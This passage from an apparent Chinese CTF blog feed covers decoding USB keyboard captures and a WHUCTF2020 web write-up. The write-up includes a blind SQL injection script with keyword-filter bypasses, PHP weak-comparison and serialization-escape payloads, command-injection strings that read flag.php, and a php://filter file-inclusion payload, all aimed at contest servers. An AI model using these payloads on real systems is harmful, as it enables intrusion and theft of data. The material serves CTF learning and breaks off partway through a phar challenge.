class="hljs-string">&quot;9&quot;</span>, <span class="hljs-comment"># or (</span><br><span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-comment"># or )</span><br><span class="hljs-string">&quot;2D&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-comment"># or _</span><br><span class="hljs-string">&quot;2E&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-comment"># or =</span><br><span class="hljs-string">&quot;2F&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-comment"># or &#123;</span><br><span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-comment"># or &#125;</span><br><span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-comment"># or |</span><br><span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-comment"># or :</span><br><span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-comment"># or &quot;</span><br><span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-comment"># or ~</span><br><span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-comment"># or &lt;</span><br><span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-comment"># or &gt;</span><br><span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-comment"># or ?</span><br>&#125;<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(FILE) <span class="hljs-keyword">as</span> f:<br>    data = f.readlines()<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> data:<br>    byte = line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>].upper()<br>    <span class="hljs-keyword">if</span> byte <span class="hljs-keyword">in</span> switcher:<br>        <span class="hljs-built_in">print</span>(switcher[byte], end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/1bf55324946f2e73417d8771b63e9f52" alt="image-20200920234730353"></p><p><img src="https://img.tucang.cc/api/image/show/4b3fb92743a877418f948245fcfae296" alt="image-20200920234751692"></p><p><img src="https://img.tucang.cc/api/image/show/6227ee4cc0467ce3edaffbdaccd19262" alt="image-20200920234809014"></p><p><img src="https://img.tucang.cc/api/image/show/90ec3ea9d0b3fd4f71ba3433433acd09" alt="image-20200920234821077"></p></li></ul><p>比如我们看前四个，对照表，就可以翻译出前四个字符是 <code>flag</code>，因此往后继续识别就可以了。</p><p>跑一遍脚本，方括号和花括号是一样的，因此提交的时候自行修改一下就可以了。</p><p><img src="https://img.tucang.cc/api/image/show/8c0336083b03a06083e1227713dbbeb9" alt="image-20200920235644178"></p><p>当然也有现成的项目，<code>https://github.com/WangYihang/UsbKeyboardDataHacker</code></p><p>下载 <code>git clone https://github.com/WangYihang/UsbKeyboardDataHacker</code></p><p>使用 <code>python UsbKeyboardDataHacker.py kb.pcapng</code></p><p><img src="https://img.tucang.cc/api/image/show/8d9c3a7de4eb3887c0e915e4a199a2da" alt="image-20200920235909296"></p><p>对于 SarCTF 的题目，我们也可以用这个脚本跑出来：</p><p><img src="https://img.tucang.cc/api/image/show/a9cd84cd6f7be2de83e879fc0bd42923" alt="image-20200921000040861"></p><p>当然还有一些师傅自己整合了一些情况的脚本：</p><p>[<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html">深入理解USB流量数据包的抓取与分析</a>]</p><p>还有一些学习的文章：</p><p><a href="https://www.anquanke.com/post/id/85218">从CTF中学USB流量捕获与解析</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/misc/traffic/protocols/USB/">CTF-Wiki</a></p><p><a href="https://www.rootusers.com/google-ctf-2016-forensic-for2-write-up/">Google CTF 2016 – Forensic “For2” Write-up</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Forensics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WHUCTF2020 Writeup</title>
    <link href="/2020/05/26/whuctf2020_writeup/"/>
    <url>/2020/05/26/whuctf2020_writeup/</url>
    
    <content type="html"><![CDATA[<p>准备考研去了，很久没有写过博客，包括网鼎杯的 <code>Writeup</code> 也咕咕咕了，刚好最近有个武大的比赛，闲来就做了一下，太久没打，只会做 <code>easy</code> 题目了，有些题目还是蛮有意思的，只写了和  <code>Web</code> 相关的几题。</p><h1 id="Easy-sqli"><a href="#Easy-sqli" class="headerlink" title="Easy_sqli"></a>Easy_sqli</h1><p>打开就是登陆框，试了万能密码发现有 <code>Login success!</code>，但是界面还是主页，应该后面就没有什么逻辑了，还爆出了执行的 <code>sql</code> 语句，非常贴心：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Your <span class="hljs-keyword">sql</span> statement <span class="hljs-keyword">is</span>: <span class="hljs-keyword">SELECT</span> password <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#<span class="hljs-string">&#x27; AND password=&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>经过测试，发现对一些关键词进行了过滤，关键词被替换成空，目前根据自己的解法发现了 <code>from</code>， <code>select</code>， <code>or</code>， <code>where</code>，采取双写绕过即可。然后发现只要 <code>sql</code> 语句是对了，那么就会有 <code>Login success!</code>，盲注解一波就出来了。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># admin&#x27; and exists(seleselectct * frfromom users)#</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> *<br><br>alphabet = [<span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>]<br>res = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># WHUCTF&#123;r3lly_re11y_n0t_d1ffIcult_yet??~&#125;</span><br><span class="hljs-comment"># from, select, or, where</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>    <span class="hljs-comment">#for char in alphabet:</span><br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):<br><span class="hljs-comment"># information_schema,easy_sql1,mysql,performance_schema</span><br><span class="hljs-comment"># payload = &quot;selselectect group_concat(schema_name) ffromrom infoorrmation_schema.schemata&quot;</span><br><br><span class="hljs-comment"># f1ag_y0u_wi1l_n3ver_kn0w,user</span><br><span class="hljs-comment"># payload = &quot;seleselectct group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()&quot; </span><br><br><span class="hljs-comment"># f111114g,id,username,password</span><br><span class="hljs-comment"># payload = &#x27;seleselectct group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database()&#x27;</span><br><br>payload = <span class="hljs-string">&quot;seselectlect group_concat(f111114g) frfromom f1ag_y0u_wi1l_n3ver_kn0w&quot;</span><br>data = &#123;<br><span class="hljs-string">&quot;pass&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<br><span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;admin&#x27; and (ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(payload, i, char)<br>&#125;<br>url = <span class="hljs-string">&#x27;http://218.197.154.9:10011/login.php&#x27;</span><br>r = requests.post(url=url, data=data)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success!&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>res += <span class="hljs-built_in">chr</span>(char)<br><span class="hljs-built_in">print</span>(res)<br><span class="hljs-keyword">break</span><br><span class="hljs-comment"># print(r.content)</span><br></code></pre></td></tr></table></figure><p>这里还有个小插曲，我字符集里面没有 <code>?</code> 和 <code>~</code>，搞得我很迷惑，问了一下出题人，地方是对的但是 <code>flag</code> 不正确，那就是字符的问题，后来直接用 <code>ascii</code> 表跑就出来了。</p><h1 id="Ezphp"><a href="#Ezphp" class="headerlink" title="Ezphp"></a>Ezphp</h1><p>php 的代码审计，源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-variable">$string_1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str1&#x27;</span>];<br><span class="hljs-variable">$string_2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str2&#x27;</span>];<br><br><span class="hljs-comment">//1st</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;1st ok&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;会代码审计嘛23333&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">//2nd</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$string_1</span>))&#123;<br>    <span class="hljs-variable">$md5_1</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$string_1</span>);<br>    <span class="hljs-variable">$md5_2</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$string_2</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$md5_1</span> != <span class="hljs-variable">$md5_2</span>)&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">strtr</span>(<span class="hljs-variable">$md5_1</span>, <span class="hljs-string">&#x27;pggnb&#x27;</span>, <span class="hljs-string">&#x27;12345&#x27;</span>);<br>        <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">strtr</span>(<span class="hljs-variable">$md5_2</span>, <span class="hljs-string">&#x27;pggnb&#x27;</span>, <span class="hljs-string">&#x27;12345&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> == <span class="hljs-variable">$b</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;2nd ok&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;can u give me the right str???&quot;</span>);<br>        &#125;<br>    &#125; <br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!!!!!!!!&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;is str1 numeric??????&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">//3nd</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/x/&#x27;</span>, <span class="hljs-string">&#x27;yy&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;aaaaa&quot;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$r</span>)[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;123456&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>看到前两关就看出来是南邮2019的原题了，这里有三个绕过：</p><ol><li>传入的 <code>num</code> 的值不可以等于 <code>23333 </code>，并且这个值要被正则表达式 <code>/^23333$/</code> 匹配到，换行符绕过正则匹配。</li><li>传入 <code>str1</code>和 <code>str2 </code>的 <code>md5 </code>值不可以一样,但是经过<code>strtr</code>函数替换后的<code>md5</code>值要一样</li><li>反序列化长度逃逸，把字符串的 <code>x</code> 都替换成 <code>yy</code></li></ol><p>第一关使用 <code>num=23333%0a</code> 即可绕过</p><p>第二关的 <code>str1</code> 要是数字，<code>str2</code> 随便用一个 md5 后是 0e 开头且为纯数字的即可。<code>str1</code> 需要 md5 后以 0e 开头，后面只包含 <code>pggnb</code> 中一个或多个的字母，其余是数字，这样一替换就都是 0e 造成 php 弱类型的绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 11230178</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>():<br><span class="hljs-keyword">global</span> dict_az<br>dict_az = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>result = <span class="hljs-string">&#x27;&#x27;</span><br>result += <span class="hljs-built_in">str</span>(i)<br>i = i + <span class="hljs-number">1</span><br>hashed_s = hashlib.md5(result.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>r = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&#x27;^0e[0-9pggnb]&#123;30&#125;&#x27;</span>, hashed_s)<br><span class="hljs-keyword">if</span> r:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] found! md5( &#123;&#125; ) ---&gt; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(result, hashed_s))<br>exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">if</span> i % <span class="hljs-number">1000000</span> == <span class="hljs-number">0</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] current value: &#123;&#125;       &#123;&#125; iterations, continue...&quot;</span>.<span class="hljs-built_in">format</span>(result, <span class="hljs-built_in">str</span>(i)))<br></code></pre></td></tr></table></figure><p>跑出来 <code>11230178</code> 即可成立，md5 值为 <code>0e732639146814822596b49bb6939b97</code>，替换后就为纯数字了，第二关过。</p><p>第三关就是 php 反序列化长度变化尾部字符串逃逸，可以参考 0ctf2016 的 piapiapia，题目将传入的 <code>username</code> 和  变量<code>password</code>打包成一个数组然后序列化，如果反序列化出来数组第二个元素等于 123456，即可得到flag。因此我们需要构造 <code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;</code> 来将字符串闭合控制第二个元素为我们的 123456，但是长度会变，我们要添加的字符串为 <code>admin&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code>，长度为20，因此我们构造20个x，<code>xxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code>，这样x就会被替换成yy，我们就多了20个位置，把我们的 payload 挤出去，就刚好可以闭合了。</p><p>完整 payload: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">url = <span class="hljs-string">&#x27;http://218.197.154.9:10015/?num=23333%0a&amp;str1=0e215962017&amp;str2=11230178&#x27;</span><br>un = <span class="hljs-string">&#x27;xxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;&#125;&#x27;</span><br>data = &#123;<br><span class="hljs-string">&quot;username&quot;</span>: un<br>&#125;<br><span class="hljs-comment"># whuctf&#123;f4f9b4cd-e80e-4570-9b82-013d257c0756&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ezcmd"><a href="#ezcmd" class="headerlink" title="ezcmd"></a>ezcmd</h1><p>这道题也是一个原题，GXYCTF2019 的 Ping Ping Ping，源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no space!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no flag&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/tac|rm|echo|cat|nl|less|more|tail|head/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;cat&#x27;t read flag&quot;</span>);<br>  &#125;<br>  <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.<span class="hljs-variable">$ip</span>); <br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br>  <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了 <code>&#123;</code>，<code>&#125;</code> ，没有过滤 <code>$</code>，空格可以使用 <code>$IFS$9</code> 绕过，管道符被过滤了，但是可以用 <code>;</code> 进行另一条命令的执行，首先 <code>?ip=;ls</code> 就可以看到 flag 就在 <code>flag.php</code></p><p><img src="https://img.tucang.cc/api/image/show/05f7980b6ab6816045465c1067477498" alt="image-20200527210656915"></p><p>然后过滤了读的命令关键字，这里用 <code>ca\t</code> 即可绕过，同时也过滤了 <code>flag.php</code> 的关键字，我们可以用拼接的方法来绕过:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?ip=;a=fl;b=ag;ca\t<span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span><span class="hljs-variable">$a</span><span class="hljs-variable">$b</span>.php <span class="hljs-regexp">//</span>但还是会被检测出来，因此我们可以换一下顺序或者换成部分<br>?ip=;a=ag;b=fl;ca\t<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span><span class="hljs-variable">$b</span><span class="hljs-variable">$a</span>.php<br>?ip=;a=lag;ca\t<span class="hljs-variable">$IFS</span><span class="hljs-variable">$9f</span><span class="hljs-variable">$a</span>.php<br></code></pre></td></tr></table></figure><p>完整 payload：<code>?ip=;a=lag;ca\t$IFS$9f$a.php</code></p><h1 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h1><p>这道题有点脑洞，在 <code>/contact.php</code> 里有提交表单的选项，随便提交发现 url 上有一些参数，题目说是文件包含，那么往这方面去想，后来发现直接加一个 <code>file</code> 参数就可以读了，flag就出来了，可能是给新生的送分题吧。</p><p>完整 payload: <code>/thankyou.php?firstname=&amp;lastname=&amp;country=australia&amp;subject=&amp;file=php://filter/convert.base64-encode/resource=flag.php</code></p><h1 id="Easy-unserialize"><a href="#Easy-unserialize" class="headerlink" title="Easy_unserialize"></a>Easy_unserialize</h1><p>这题考察的是上传 phar 触发反序列化，刚好补了一下我的坑。。可以参考创宇的 paper: <code>https://paper.seebug.org/680/</code></p><p>还是学弟发现在主页加参数 <code>?acti0n=php://filter/convert.Base64-encode/resource=upload.php</code> 可以读到源码，于是把 <code>view.php</code> 和 <code>upload.php</code> 的源码看了一下， <code>upload</code> 的源码好像没有什么利用的点，看到 <code>view.php</code> 的时候，发现了一个 <code>phar</code> 的危险函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delete_img</span>(<span class="hljs-params"><span class="hljs-variable">$file_name</span></span>) </span>&#123;<br> 